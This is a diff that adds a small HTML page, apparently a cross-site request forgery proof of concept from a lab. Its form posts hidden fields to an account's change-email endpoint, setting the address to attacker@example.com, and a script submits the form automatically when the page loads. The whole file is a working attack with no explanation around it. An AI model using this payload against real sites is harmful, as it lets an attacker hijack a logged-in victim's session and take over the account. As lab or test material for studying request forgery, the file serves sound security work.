@@ -1,0 +1,11 @@
+<html>
+  <body>
+    <form method="POST" action="https://example.com/my-account/change-email">
+      <input type="hidden" name="email" value="attacker@example.com">
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
